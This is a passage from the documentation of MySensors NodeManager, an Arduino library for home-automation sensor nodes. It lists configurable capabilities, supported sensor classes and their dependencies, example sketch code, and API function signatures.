manually.\nConfiguration\nOpen the Template sketch from the Arduino IDE under File -> Examples -> MySensors Nodemanager -> Template\nAlternatively, open one of the provided example\nCustomize NodeManager's and your sensors settings (see below)\nMySensors configuration\nSince NodeManager has to communicate with the MySensors network on your behalf, it has to know how to do it. On top of the template sketch you will find the typical MySensors directives you are used to which can be customized to configure the board to act as a MySensors node or a MySensors gateway.\nNodeManager configuration\nNodeManager built-in capabilities can be enabled/disabled also when you need to save some storage for your code. To enable/disable a built-in feature:\nInstall the required dependency if any\nEnable the corresponding capability by setting it to ON in the main sketch. To disable it, set it to OFF\nWhen a capability is enabled additional functions may be made available. Have a look at the API documentation for details\nA list of the supported capabilities and the required dependencies is presented below:\nCapability Default Description Dependencies\nNODEMANAGER_DEBUG ON NodeManager's debug output on serial console -\nNODEMANAGER_DEBUG_VERBOSE OFF increase NodeManager's debug output on the serial console -\nNODEMANAGER_POWER_MANAGER OFF allow powering on your sensors only while the node is awake -\nNODEMANAGER_INTERRUPTS ON allow managing interrupt-based sensors like a PIR or a door sensor -\nNODEMANAGER_CONDITIONAL_REPORT OFF allow reporting a measure only when different from the previous or above/below a given threshold -\nNODEMANAGER_EEPROM OFF allow keeping track of some information in the EEPROM -\nNODEMANAGER_SLEEP ON allow managing automatically the complexity behind battery-powered sleeping sensors -\nNODEMANAGER_RECEIVE ON allow the node to receive messages; can be used by the remote API or for triggering the sensors -\nNODEMANAGER_TIME OFF allow keeping the current system time in sync with the controller https://github.com/PaulStoffregen/Time\nNODEMANAGER_RTC OFF allow keeping the current system time in sync with an attached RTC device https://github.com/JChristensen/DS3232RTC\nNODEMANAGER_SD OFF allow reading from and writing to SD cards -\nNODEMANAGER_HOOKING OFF allow custom code to be hooked in the out of the box sensors -\nNODEMANAGER_OTA_CONFIGURATION OFF allow over-the-air configuration of the sensors -\nNODEMANAGER_SERIAL_INPUT OFF read from the serial port at the end of each loop cycle expecting a serial protocol command -\nOnce the NodeManager library header file is included, a global instance of the NodeManager class called nodeManager is made available and can be used all along the sketch.\nAdd your sensors\nNodeManager provides built-in implementation of a number of sensors through ad-hoc classes located within the \"sensors\" directory of the library. To use a built-in sensor:\nInstall the required dependencies, if any manually or through the Arduino IDE Library Manager (see below)\nInclude the sensor header file (e.g. #include <sensors/SensorBattery.h>)\nCreate an instance of the sensor's class (e.g. SensorBattery battery(node))\nOnce created, the sensor will automatically present one or more child to the gateway and controller. A list of built-in sensors, required dependencies and the number of child automatically created is presented below:\nSensor/Class Name #Child Description Dependencies\nSensorBattery 1 Built-in sensor for automatic battery reporting -\nSensorSignal 1 Built-in sensor for automatic signal level reporting -\nSensorAnalogInput 1 Generic analog sensor, return a pin's analog value or its percentage -\nSensorLDR 1 LDR sensor, return the light level of an attached light resistor in percentage -\nSensorRain 1 Rain sensor, return the percentage of rain from an attached analog sensor -\nSensorSoilMoisture 1 Soil moisture sensor, return the percentage of moisture from an attached analog sensor -\nSensorThermistor 1 Thermistor sensor, return the temperature based on the attached thermistor -\nSensorML8511 1 ML8511 sensor, return UV intensity -\nSensorACS712 1 ACS712 sensor, measure the current going through the attached module -\nSensorDigitalInput 1 Generic digital sensor, return a pin's digital value -\nSensorDigitalOutput 1 Generic digital output sensor, allows setting the digital output of a pin to the requested value -\nSensorRelay 1 Relay sensor, allows activating the relay -\nSensorLatchingRelay1Pin 1 Latching Relay sensor, allows toggling the relay with a pulse on the configured pin -\nSensorLatchingRelay2Pins 1 Latching Relay sensor, allows turing the relay on and off with a pulse on the configured pins -\nSensorDHT11 2 DHT11 sensor, return temperature/humidity based on the attached DHT sensor https://github.com/mysensors/MySensorsArduinoExamples/tree/master/libraries/DHT\nSensorDHT22 2 DHT22 sensor, return temperature/humidity based on the attached DHT sensor https://github.com/mysensors/MySensorsArduinoExamples/tree/master/libraries/DHT\nSensorSHT21 2 SHT21 sensor, return temperature/humidity based on the attached SHT21 sensor https://github.com/SodaqMoja/Sodaq_SHT2x\nSensorHTU21D 2 HTU21D sensor, return temperature/humidity based on the attached HTU21D sensor https://github.com/SodaqMoja/Sodaq_SHT2x\nSensorInterrupt 1 Generic interrupt-based sensor, wake up the board when a pin changes status -\nSensorDoor 1 Door sensor, wake up the board and report when an attached magnetic sensor has been opened/closed -\nSensorMotion 1 Motion sensor, wake up the board and report when an attached PIR has triggered -\nSensorDs18b20 1+ DS18B20 sensor, return the temperature based on the attached sensor https://github.com/milesburton/Arduino-Temperature-Control-Library\nSensorBH1750 1 BH1750 sensor, return light level in lux https://github.com/claws/BH1750\nSensorMLX90614 2 MLX90614 contactless temperature sensor, return ambient and object temperature https://github.com/adafruit/Adafruit-MLX90614-Library\nSensorBME280 4 BME280 sensor, return temperature/humidity/pressure based on the attached BME280 sensor https://github.com/adafruit/Adafruit_BME280_Library\nSensorBMP085 3 BMP085 sensor, return temperature and pressure https://github.com/adafruit/Adafruit-BMP085-Library\nSensorBMP180 3 BMP180 sensor, return temperature and pressure https://github.com/adafruit/Adafruit-BMP085-Library\nSensorBMP280 3 BMP280 sensor, return temperature/pressure based on the attached BMP280 sensor https://github.com/adafruit/Adafruit_BMP280_Library\nSensorSonoff 1 Sonoff wireless smart switch https://github.com/thomasfredericks/Bounce2\nSensorHCSR04 1 HC-SR04 sensor, return the distance between the sensor and an object https://github.com/mysensors/MySensorsArduinoExamples/tree/master/libraries/NewPing\nSensorMCP9808 1 MCP9808 sensor, measure the temperature through the attached module https://github.com/adafruit/Adafruit_MCP9808_Library\nSensorMQ 1 MQ sensor, return ppm of the target gas. Tuned by default for MQ135 and CO2 -\nSensorMHZ19 1 MH-Z19 CO2 sensor via UART (SoftwareSerial, default on pins 6(Rx) and 7(Tx) -\nSensorAM2320 2 AM2320 sensors, return temperature/humidity based on the attached AM2320 sensor https://github.com/thakshak/AM2320\nSensorTSL2561 1 TSL2561 sensor, return light in lux https://github.com/adafruit/TSL2561-Arduino-Library\nSensorPT100 1 DFRobot Driver high temperature sensor, return the temperature from the attached PT100 sensor https://github.com/nxcosa/HighTemperatureSensor\nSensorDimmer 1 Generic dimmer sensor used to drive a pwm output -\nSensorRainGauge 1 Rain gauge sensor -\nSensorPowerMeter 1 Power meter pulse sensor -\nSensorWaterMeter 1 Water meter pulse sensor -\nSensorPlantowerPMS 3 Plantower PMS particulate matter sensors (reporting PM<=1.0, PM<=2.5 and PM<=10.0 in \u00b5g/m\u00b3) https://github.com/fu-hsi/pms\nSensorVL53L0X 1 VL53L0X laser time-of-flight distance sensor via I\u00b2C, sleep pin supported (optional) https://github.com/pololu/vl53l0x-arduino\nDisplaySSD1306 1 SSD1306 128x64 OLED display (I\u00b2C); By default displays values of all sensors and children https://github.com/greiman/SSD1306Ascii.git\nSensorSHT31 2 SHT31 sensor, return temperature/humidity based on the attached SHT31 sensor https://github.com/adafruit/Adafruit_SHT31\nSensorSI7021 2 SI7021 sensor, return temperature/humidity based on the attached SI7021 sensor https://github.com/sparkfun/SparkFun_Si701_Breakout_Arduino_Library\nSensorChirp 3 Chirp soil moisture sensor (includes temperature and light sensors) https://github.com/Apollon77/I2CSoilMoistureSensor\nDisplayHD44780 1 Supports most Hitachi HD44780 based LCDs, by default displays values of all sensors and children https://github.com/cyberang3l/NewLiquidCrystal\nSensorTTP 1 TTP226/TTP229 Touch control sensor -\nSensorServo 1 Control a generic Servo motor sensor -\nSensorAPDS9960 1 SparkFun RGB and Gesture Sensor https://github.com/sparkfun/APDS-9960_RGB_and_Gesture_Sensor\nSensorNeopixel 1 Control a Neopixel LED https://github.com/adafruit/Adafruit_NeoPixel\nSensorSDS011 2 SDS011 air quality sensor, return concentrations of 2.5 and 10 micrometer particles. https://github.com/ricki-z/SDS011\nSensorFPM10A 1 FPM10A fingerprint sensor https://github.com/adafruit/Adafruit-Fingerprint-Sensor-Library\nSensorPH 1 PH ( SKU SEN161 ) sensor, measure the analog value from the amplifier module -\nSensorPca9685W 2 Generic dimmer sensor (S_DIMMER) used to drive a single channel pwm output of PCA9685 https://github.com/adafruit/Adafruit-PWM-Servo-Driver-Library\nSensorPca9685Rgb 2 Generic RGB-dimmer sensor (S_RGB_LIGHT) used to drive RGB resp. 3-channel pwm output of PCA9685 https://github.com/adafruit/Adafruit-PWM-Servo- Driver-Library\nSensorPca9685Rgbw 2 Generic RGBW-dimmer sensor (S_RGBW_LIGHT) used to drive RGBW resp. 4-channel pwm output of PCA9685 https://github.com/adafruit/Adafruit-PWM-Servo-Driver-Library\nSensorDSM501A 1 Dust sensor module DSM501A for PM1.0 and PM2.5 particles -\nSensorPN532 1 PN532 NFC RFID Module https://github.com/elechouse/PN532\nSensorCCS811 1 CCS811 gas/Air Quality sensor. Measure VOC and eCO2 https://github.com/adafruit/Adafruit_CCS811\nSensorMPR121 1 MPR121-based capacitive touch control sensor https://github.com/adafruit/Adafruit_MPR121\nSensorGSM 1 Send SMS through an attached serial modem (e.g. SIM900) -\nThose sensors requiring a pin to operate would take it as an argument in the constructor. NodeManager automatically creates all the child_ids, assigning an incremental counter. If you need to set your own child_id, pass it as the last argument to the constructor\nExamples:\n// Add a thermistor sensor attached to pin A0\n#include <sensors/SensorThermistor.h>\nSensorThermistor thermistor(A0);\n// Add a LDR sensor attached to pin A0 and assing child_id 5\n#include <sensors/SensorLDR.h>\nSensorLDR ldr(A1,5);\n// Add a temperature/humidity sensor SHT21 sensor. No pin required since using i2c\n#include <sensors/SensorSHT21.h>\nSensorSHT21 sht21;\nThe sensor will be then registered automatically with NodeManager which will take care of it all along its lifecycle. NodeManager will present each sensor for you to the controller, query each sensor and report the measure back to the gateway/controller. For actuators (e.g. relays) those can be triggered by sending a REQ/SET message with the expected type to their assigned child id.\nInstalling the dependencies\nSome of the sensors and buit-in capabilities rely on third party libraries. Those libraries are not included within NodeManager and have to be installed from the Arduino IDE Library Manager (Sketch -> Include Library -> Manager Libraries) or manually. You need to install the library ONLY if you are planning to enable to use the sensor.\nConfigure your sensors\nNodeManager and all the sensors can be configured from within before() in the main sketch. Find Configure your sensors below to customize the behavior of any sensor by invoking one of the functions available.\nExamples:\n// report measures of every attached sensors every 10 minutes\nnodeManager.setReportIntervalMinutes(10);\n// set the node to sleep in 5 minutes cycles\nnodeManager.setSleepMinutes(5);\n// report battery level every 10 minutes\nbattery.setReportIntervalMinutes(10);\n// set an offset to -1 to a thermistor sensor\nthermistor.setOffset(-1);\n// Change the id of a the first child of a sht21 sensor\nsht21.children.get(1)->child_id = 5;\n// power all the nodes through dedicated pins\nnodeManager.setPowerManager(power);\nIf not instructed differently, the node will stay awake and all the sensors will report every 10 minutes, battery level and signal level will be automatically reported every 60 minutes (if the corresponding sensors have been added).\nPlease note, if you configure a sleep cycle, this may have an impact on the reporting interval since the sensor will be able to report its measures ONLY when awake. For example if you set a report interval of 5 minutes and a sleep cycle of 10 minutes, the sensors will report every 10 minutes.\nRunning your code\nOnce finished configuring your node, upload your sketch to your Arduino board as you are used to.\nCheck your gateway's logs to ensure the node is working as expected. You should see the node presenting itself, presenting all the registered sensors and reporting new measures at the configured reporting interval. When NODEMANAGER_DEBUG is enabled, detailed information will be available through the serial port. The better understand the logs generaged by NodeManager, paste them into MySensors Log Parser (https://mysensors.org/build/parser). Remember to disable debug once the tests have been completed to save additional storage.\nCommunicate with the sensors\nYou can interact with each registered sensor by sending to the child id a REQ command (or a SET for output sensors like relays). For example to request the temperature to node_id 254 and child_id 1:\n254;1;2;0;0;\nTo activate a relay connected to the same node, child_id 100 we need to send a SET command with payload set to 1:\n254;100;1;0;2;1\nNo need to implement anything on your side since for built-in sensors this is handled automatically.\nAPI\nYou can interact with each class provided by NodeManager through a set of API functions.\nNodeManager API\n// instantiate a NodeManager object. An optional fixed number of sensors can be passed as an argument\nNodeManager(uint8_t sensorcount = 0);\n// [10] send the same message multiple times (default: 1)\nvoid setRetries(uint8_t value);\n// [21] set this to true if you want destination node to send ack back to this node (default: false)\nvoid setAck(bool value);\nbool getAck();\n// Request the controller's configuration on startup (default: true)\nvoid setGetControllerConfig(bool value);\n// [22] Manually set isMetric setting\nvoid setIsMetric(bool value);\nbool getIsMetric();\n// Convert a temperature from celsius to fahrenheit depending on how isMetric is set\nfloat celsiusToFahrenheit(float temperature);\n// return true if sleep or wait is configured and hence this is a sleeping node\nbool isSleepingNode();\n// [1] Send a hello message back to the controller\nvoid hello();\n// [6] reboot the board\nvoid reboot();\n// [36] set the default interval in minutes all the sensors will report their measures. If the same function is called on a specific sensor, this will not change the previously set value. On sleeping sensors, the elapsed time can be evaluated only upon wake up (default: 10 minutes)\nvoid setReportIntervalSeconds(unsigned long value);\nunsigned long getReportIntervalSeconds();\n// [37] set the default interval in minutes all the sensors will report their measures. If the same function is called on a specific sensor, this will not change the previously set value. On sleeping sensors, the elapsed time can be evaluated only upon wake up (default: 10 minutes)\nvoid setReportIntervalMinutes(unsigned long value);\n// [38] set the default interval in minutes all the sensors will report their measures. If the same function is called on a specific sensor, this will not change the previously set value. On sleeping sensors, the elapsed time can be evaluated only upon wake up (default: 10 minutes)\nvoid setReportIntervalHours(unsigned int value);\n// [39] set the default interval in minutes all the sensors will report their measures. If the same function is called on a specific sensor, this will not change the previously set value. On sleeping sensors, the elapsed time can be evaluated only upon wake up (default: 10 minutes)\nvoid setReportIntervalDays(uint8_t value);\n// [30] if set and when the board is battery powered, sleep() is always called instead of wait() (default: true)\nvoid setSleepOrWait(bool value);\n// sleep if the node is a battery powered or wait if it is not for the given number of milliseconds\nvoid sleepOrWait(unsigned long value);\n// [31] set which pin is connected to RST of the board to reboot the board when requested. If not set the software reboot is used instead (default: -1)\nvoid setRebootPin(int8_t value);\n// [32] turn the ADC off so to save 0.2 mA\nvoid setADCOff();\n// send a message by providing the source child, type of the message and value\nvoid sendMessage(uint8_t child_id, uint8_t type, int value);\nvoid sendMessage(uint8_t child_id, uint8_t type, float value, uint8_t precision);\nvoid sendMessage(uint8_t child_id, uint8_t type, double value, uint8_t precision);\nvoid sendMessage(uint8_t child_id, uint8_t type, const char* value);\n// register a sensor\nvoid registerSensor(Sensor* sensor);\n#if NODEMANAGER_SLEEP == ON\n// register a timer\nvoid registerTimer(Timer* timer);\n#endif\n// return the next-available child id\nuint8_t getAvailableChildId(uint8_t child_id = 0);\n// list containing all the registered sensors\nList<Sensor*> sensors;\n// return the Child object of the given child_id\nChild* getChild(uint8_t child_id);\n// return the sensor object of the given child_id\nSensor* getSensorWithChild(uint8_t child_id);\n// sleep between send()\nvoid sleepBetweenSend();\n// set the analog reference to the given value and optionally perform some fake reading on the given pin\nvoid setAnalogReference(uint8_t value, uint8_t pin = -1);\n#if NODEMANAGER_SLEEP == ON\n// [3] set the duration (in seconds) of a sleep cycle\nvoid setSleepSeconds(unsigned long value);\nunsigned long getSleepSeconds();\n// [4] set the duration (in minutes) of a sleep cycle\nvoid setSleepMinutes(unsigned long value);\n// [5] set the duration (in hours) of a sleep cycle\nvoid setSleepHours(unsigned int value);\n// [29] set the duration (in days) of a sleep cycle\nvoid setSleepDays(uint8_t value);\n// [20] optionally sleep interval in milliseconds before sending each message to the radio network (default: 0)\nvoid setSleepBetweenSend(unsigned int value);\n// [9] wake up the board\nvoid wakeup();\n// use smart sleep for sleeping boards (default: true)\nvoid setSmartSleep(bool value);\n#endif\n#if NODEMANAGER_INTERRUPTS == ON\n// [19] if enabled, when waking up from the interrupt, the board stops sleeping. Disable it when attaching e.g. a motion sensor (default: true)\nvoid setSleepInterruptPin(int8_t value);\n// configure the interrupt pin and mode. Mode can be CHANGE, RISING, FALLING (default: MODE_NOT_DEFINED)\nvoid setInterrupt(int8_t pin, uint8_t mode, int8_t initial = -1);\n// [28] ignore two consecutive interrupts if happening within this timeframe in milliseconds (default: 100)\nvoid setInterruptDebounce(unsigned long value);\n// return the pin from which the last interrupt came\nint8_t getLastInterruptPin();\n// return the value of the pin from which the last interrupt came\nint8_t getLastInterruptValue();\n#endif\n#if NODEMANAGER_POWER_MANAGER == ON\n// configure a PowerManager common to all the sensors\nvoid setPowerManager(PowerManager& powerManager);\n// to save battery the sensor can be optionally connected to two pins which will act as vcc and ground and activated on demand\nvoid setPowerPins(int8_t ground_pin, int8_t vcc_pin, unsigned long wait_time = 50);\n// [24] manually turn the power on\nvoid powerOn();\n// [25] manually turn the power off\nvoid powerOff();\n#endif\n#if NODEMANAGER_EEPROM == ON\n// [7] clear the EEPROM\nvoid clearEeprom();\n// return the value stored at the requested index from the EEPROM\nint loadFromMemory(int index);\n// [27] save the given index of the EEPROM the provided value\nvoid saveToMemory(int index, int value);\n// [40] if set save the sleep settings in memory, also when changed remotely (default: false)\nvoid setSaveSleepSettings(bool value);\n#endif\n#if NODEMANAGER_TIME == ON\n// [41] synchronize the local time with the controller\nvoid syncTime();\n// [42] returns the current system time\nunsigned long getTime();\n// [43] set the hour offset for when syncronizing the time (default: 0)\nvoid setTimezone(int8_t value);\n// request the current time to the controller during setup(). Time with a RTC if configured is always synchronized (default: true)\nvoid setSyncTimeOnSetup(bool value);\n// request the current time to the controller just after a sleep cycle. Time with a RTC if configured is always synchronized (default: true)\nvoid setSyncTimeAfterSleep(bool value);\n// request the current time to the controller after the configured number of minutes (default: 0)\nvoid setSyncTimeAfterInterval(unsigned long value);\n// receiveTime() callback\nvoid receiveTime(unsigned long ts);\n#endif\n#if NODEMANAGER_SD == ON\n// SD card variables\nSd2Card sd_card;\nSdVolume sd_volume;\nSdFile sd_root;\nSdFile sd_file;\n#endif\n// hook into the main sketch functions\nvoid before();\nvoid presentation();\nvoid setup();\nvoid loop();\n#if NODEMANAGER_RECEIVE == ON\nvoid receive(const MyMessage & msg);\nSensor API\nThe following methods are available for all the sensors:\nSensor(int8_t pin = -1);\n// return the name of the sensor\nconst char* getName();\n// [1] where the sensor is attached to (default: not set)\nvoid setPin(int8_t value);\n// [5] For some sensors, the measurement can be queried multiple times and an average is returned (default: 1)\nvoid setSamples(unsigned int value);\n// [6] If more then one sample has to be taken, set the interval in milliseconds between measurements (default: 0)\nvoid setSamplesInterval(unsigned long value);\n// [17] After how many seconds the sensor will report back its measure (default: 10 minutes)\nvoid setReportIntervalSeconds(unsigned long value);\n// [16] After how many minutes the sensor will report back its measure (default: 10 minutes)\nvoid setReportIntervalMinutes(unsigned long value);\n// [19] After how many hours the sensor will report back its measure (default: 10 minutes)\nvoid setReportIntervalHours(unsigned int value);\n// [20] After how many days the sensor will report back its measure (default: 10 minutes)\nvoid setReportIntervalDays(uint8_t value);\n// [24] Set the way the timer used for reporting to the gateway should operate. It can be either TIME_INTERVAL (e.g. report every X seconds with the amount of time set with setReportTimerValue()), IMMEDIATELY (e.g. report at every cycle, useful for sensors like actuators which should report as soon as the value has changed), DO_NOT_REPORT (e.g. never report, useful for when there is no need to report, like a Display) and when NODEMANAGER_TIME is ON, EVERY_MINUTE/EVERY_HOUR/EVERY_DAY (e.g. to report the value set in the previous timeframe, useful for sensors reporting an accumulated value linked to a timeframe at regular intervals), AT_MINUTE/AT_HOUR/AT_DAY (e.g. report at a given minute/hour/day, useful if the measure is expected at a specified time, set with setReportTimerValue())\nvoid setReportTimerMode(timer_mode value);\n// [25] Set the value for the reporting timer's mode which has been set with setReportTimerMode()\nvoid setReportTimerValue(unsigned long value);\n// [26] Set the way the timer used for taking measures should operate. Takes the same parameters as setReportTimerMode(). If not set explicitly, will be set as the reporting timer\nvoid setMeasureTimerMode(timer_mode value);\n// [27] Set the value for the reporting timer's mode which has been set with setReportTimerMode() If not set explicitely, will be set with the same value as the reporting timer\nvoid setMeasureTimerValue(unsigned long value);\n// list of configured child\nList<Child*> children;\n// return the child object based on the provided child_id\nChild* getChild(uint8_t child_id);\n// register a child\nvoid registerChild(Child* child);\n#if NODEMANAGER_INTERRUPTS == ON\n// return the pin the interrupt is attached to\nint8_t getInterruptPin();\n// set initial value of the configured pin. Can be used for internal pull up\nvoid setPinInitialValue(int8_t value);\n// for interrupt-based sensor, set the interrupt mode. Can be CHANGE, RISING, FALLING (default: CHANGE)\nvoid setInterruptMode(uint8_t value);\n// [22] for interrupt-based sensor, milliseconds to wait/sleep after the interrupt before reporting (default: 0)\nvoid setWaitAfterInterrupt(unsigned long value);\n// [23] for interrupt-based sensor, the value of the pin is checked and the interrupt ignored if RISING and not HIGH or FALLING and not LOW (default: true)\nvoid setInterruptStrict(bool value);\n#endif\n#if NODEMANAGER_POWER_MANAGER == ON\n// set a previously configured PowerManager to the sensor so to powering it up with custom pins\nvoid setPowerManager(PowerManager& powerManager);\n// to save battery the sensor can be optionally connected to two pins which will act as vcc and ground and activated on demand\nvoid setPowerPins(int8_t ground_pin, int8_t vcc_pin, unsigned long wait_time = 50);\n// [13] manually turn the power on\nvoid powerOn();\n// [14] manually turn the power off\nvoid powerOff();\n#endif\n#if NODEMANAGER_HOOKING == ON\n// set a custom hook function to be called when the sensor executes its setup() function\nvoid setSetupHook(void (*function)(Sensor* sensor));\n// set a custom hook function to be called just before the sensor executes its loop() function\nvoid setPreLoopHook(void (*function)(Sensor* sensor));\n// set a custom hook function to be called just after the sensor executes its loop() function\nvoid setPostLoopHook(void (*function)(Sensor* sensor));\n// set a custom hook function to be called when the sensor executes its interrupt() function\nvoid setInterruptHook(void (*function)(Sensor* sensor));\n// set a custom hook function to be called when the sensor executes its receive() function\nvoid setReceiveHook(void (*function)(Sensor* sensor, MyMessage* message));\n#endif\n// define what to do at each stage of the sketch\nvoid presentation();\nvoid setup();\nvoid loop(MyMessage* message);\n#if NODEMANAGER_INTERRUPTS == ON\nbool interrupt();\n#endif\n#if NODEMANAGER_RECEIVE == ON\nvoid receive(MyMessage* message);\n#endif\n// abstract functions, subclasses may implement\nvirtual void onSetup();\nvirtual void onLoop(Child* child);\nvirtual void onReceive(MyMessage* message);\nvirtual void onInterrupt();\n#if NODEMANAGER_OTA_CONFIGURATION == ON\nvirtual void onOTAConfiguration(ConfigurationRequest* request);\n#endif\nChild API\nThe following methods are available for all the child:\nChild(Sensor* sensor, value_format format, uint8_t child_id, uint8_t presentation, uint8_t type, const char* description = \"\");\n// set child id used to communicate with the gateway/controller\nvoid setChildId(uint8_t value);\nuint8_t getChildId();\n// set sensor format\nvoid setFormat(value_format value);\nvalue_format getFormat();\n// set sensor presentation (default: S_CUSTOM)\nvoid setPresentation(uint8_t value);\nuint8_t getPresentation();\n// set sensor type (default: V_CUSTOM)\nvoid setType(uint8_t value);\nuint8_t getType();\n// set how many decimal digits to use (default: 2 for ChildFloat, 4 for ChildDouble)\nvoid setFloatPrecision(uint8_t value);\n// set sensor description\nvoid setDescription(const char* value);\nconst char* getDescription();\n// configure the behavior of the child when setValue() is called multiple times. It can be NONE (ignore the previous values but the last one), AVG (averages the values), SUM (sum up the values) (default: AVG)\nvoid setValueProcessing(child_processing value);\n// send the value to the gateway even if there have been no samples collected (default: false)\nvoid setSendWithoutValue(bool value);\n// set the value of the child\nvoid setValue(int value);\nvoid setValue(float value);\nvoid setValue(double value);\nvoid setValue(const char* value);\n// get the value of the child\nint getValueInt();\nfloat getValueFloat();\ndouble getValueDouble();\nconst char* getValueString();\n// check if the value must be sended back to the controller\nbool valueReadyToSend();\n// send the current value to the gateway\nvoid sendValue(bool force = 0);\n// print the current value on a LCD display\nvoid print(Print& device);\n// reset all the counters\nvoid reset();\n#if NODEMANAGER_CONDITIONAL_REPORT == ON\n// force to send an update after the configured number of minutes\nvoid setForceUpdateTimerValue(unsigned long value);\n// never report values below this threshold (default: -FLT_MAX)\nvoid setMinThreshold(float value);\n// never report values above this threshold (default: FLT_MAX)\nvoid setMaxThreshold(float value);\n// do not report values if too close to the previous one (default: 0)\nvoid setValueDelta(float value);\n// set when the last value is updated. Possible values are UPDATE_ALWAYS (at every cycle), UPDATE_ON_SEND (only after sending) (default: UPDATE_ON_SEND)\nvoid setUpdateLastValue(last_value_mode value);\n// get the last value of the child\nint getLastValueInt();\nfloat getLastValueFloat();\ndouble getLastValueDouble();\nconst char* getLastValueString();\n#endif\n#if NODEMANAGER_EEPROM == ON\n// persist the child's value in EEPROM. The value will be saved at each update and loaded at boot time (default: false)\nvoid setPersistValue(bool value);\nbool getPersistValue();\n// load old value from EEPROM\nvoid loadValue();\n// load current value to EEPROM\nvoid saveValue();\n#endif\nBuilt-in sensors API\nEach sensor class may expose additional methods.\nSensorBattery\n// [102] the expected vcc when the batter is fully discharged, used to calculate the percentage (default: 2.7)\nvoid setMinVoltage(float value);\n// [103] the expected vcc when the batter is fully charged, used to calculate the percentage (default: 3.3)\nvoid setMaxVoltage(float value);\n// [104] if true, the battery level will be evaluated by measuring the internal vcc without the need to connect any pin, if false the voltage divider methon will be used (default: true)\nvoid setBatteryInternalVcc(bool value);\n// [105] if setBatteryInternalVcc() is set to false, the analog pin to which the battery's vcc is attached (https://www.mysensors.org/build/battery) (default: -1)\nvoid setBatteryPin(int8_t value);\n// [106] if setBatteryInternalVcc() is set to false, the volts per bit ratio used to calculate the battery voltage (default: 0.003363075)\nvoid setBatteryVoltsPerBit(float value);\n// [107] change battery voltage calibration factor\nvoid setBatteryCalibrationFactor(float value);\n// if true call sendBatteryLevel() in addition to send the measured voltage back (default: true)\nvoid setSendBatteryLevel(bool value);\nSensorSignal\n// [101] define which signal report to send. Possible values are SR_UPLINK_QUALITY, SR_TX_POWER_LEVEL, SR_TX_POWER_PERCENT, SR_TX_RSSI, SR_RX_RSSI, SR_TX_SNR, SR_RX_SNR (default: SR_RX_RSSI)\nvoid setSignalCommand(int value);\nSensorAnalogInput / SensorLDR / SensorRain / SensorSoilMoisture\n// [101] the analog reference to use (default: not set, can be either INTERNAL or DEFAULT)\nvoid setReference(int value);\n// [102] reverse the value or the percentage (e.g. 70% -> 30%) (default: false)\nvoid setReverse(bool value);\n// [103] when true returns the value as a percentage (default: true)\nvoid setOutputPercentage(bool value);\n// [104] minimum value for calculating the percentage (default: 0)\nvoid setRangeMin(int value);\n// [105] maximum value for calculating the percentage (default: 1024)\nvoid setRangeMax(int value);\nSensorThermistor\n// [101] resistance at 25 degrees C (default: 10000)\nvoid setNominalResistor(long value);\n// [102] temperature for nominal resistance (default: 25)\nvoid setNominalTemperature(int value);\n// [103] The beta coefficient of the thermistor (default: 3950)\nvoid setBCoefficient(int value);\n// [104] the value of the resistor in series with the thermistor (default: 10000)\nvoid setSeriesResistor(long value);\n// [105] set a temperature offset\nvoid setOffset(float value);\nSensorACS712\n// [101] set how many mV are equivalent to 1 Amp. The value depends on the module (185 for 5A Module, 100 for 20A Module, 66 for 30A Module) (default: 185);\nvoid setmVPerAmp(int value);\n// [102] set ACS offset (default: 2500);\nvoid setOffset(int value);\n// [103] set AC Measurement mode\nvoid setACMode(bool value);\n// [104] set AC noise\nvoid setACNoise(int value);\n// [105] Adjust AC noise\nvoid computeACNoise();\nSensorDigitalInput\n// Invert the value to report. E.g. report 1 if value is LOW, report 0 if HIGH (default: false)\nvoid setInvertValueToReport(bool value);\n// Set optional internal pull up/down\nvoid setInitialValue(int value);\nSensorDigitalOutput / SensorRelay / SensorLatchingRelay1Pin / SensorLatchingRelay2Pins\n// [104] when legacy mode is enabled expect a REQ message to trigger, otherwise the default SET (default: false)\nvoid setLegacyMode(bool value);\n// [105] automatically turn the output off after the given number of minutes\nvoid setSafeguard(int value);\n// [106] if true the input value becomes a duration in minutes after which the output will be automatically turned off (default: false)\nvoid setInputIsElapsed(bool value);\n// [107] optionally wait for the given number of milliseconds after changing the status (default: 0)\nvoid setWaitAfterSet(int value);\n// [108] when switching on, turns the output off after the given number of milliseconds. For latching relay controls the pulse width (default: 0)\nvoid setPulseWidth(int value);\n// [109] Invert the value to write. E.g. if ON is received, write LOW (default: false)\nvoid setInvertValueToWrite(bool value);\n// [110] for a 2-pins latching relay, set the pin which turns the relay off (default: -1)\nvoid setPinOff(int8_t value);\n// manually switch the output to the provided status (ON or OFF)\nvoid setStatus(int value);\n// toggle the status\nvoid toggleStatus(int value);\nSensorInterrupt / SensorDoor / SensorMotion\n// [105] Invert the value to report. E.g. if FALLING and value is LOW, report HIGH (default: false)\nvoid setInvertValueToReport(bool value);\n#if NODEMANAGER_TIME == ON\n// [107] when keeping track of the time, trigger only after X consecutive interrupts within the same minute (default: 1)\nvoid setThreshold(int value);\n#endif\nSensorDs18b20\n// returns the sensor's resolution in bits\nint getResolution();\n// [101] set the sensor's resolution in bits\nvoid setResolution(int value);\n// [102] sleep while DS18B20 calculates temperature (default: false)\nvoid setSleepDuringConversion(bool value);\n// return the sensors' device address\nDeviceAddress* getDeviceAddress();\nSensorBH1750\n// [101] set sensor reading mode, e.g. BH1750_ONE_TIME_HIGH_RES_MODE\nvoid setMode(uint8_t mode);\nSensorBME280 / SensorBMP085 / SensorBMP280\n// [101] define how many pressure samples to keep track of for calculating the forecast (default: 5)\nvoid setForecastSamplesCount(int value);\nSensorBME280\n// set custom sampling to the sensor\nvoid setSampling(Adafruit_BME280::sensor_mode mode, Adafruit_BME280::sensor_sampling tempSampling, Adafruit_BME280::sensor_sampling pressSampling, Adafruit_BME280::sensor_sampling humSampling, Adafruit_BME280::sensor_filter filter, Adafruit_BME280::standby_duration duration);\nSensorSonoff\n// [101] set the button's pin (default: 0)\nvoid setButtonPin(int8_t value);\n// [102] set the relay's pin (default: 12)\nvoid setRelayPin(int8_t value);\n// [103] set the led's pin (default: 13)\nvoid setLedPin(int8_t value);\nSensorHCSR04\n// [103] Maximum distance we want to ping for (in centimeters) (default: 300)\nvoid setMaxDistance(int value);\n// [104] Report the measure even if is invalid (e.g. 0) (default: true)\nvoid setReportIfInvalid(bool value);\nSensorMQ\n// [102] set the load resistance on the board, in ohms (default: 1000);\nvoid setRlValue(float value);\n// [103] set the Ro resistance in ohms. By default will be calculated at startup during the calibration phase using the known ppm provided\nvoid setRoValue(float value);\n// [104] set the ppm used during the calibration (default: 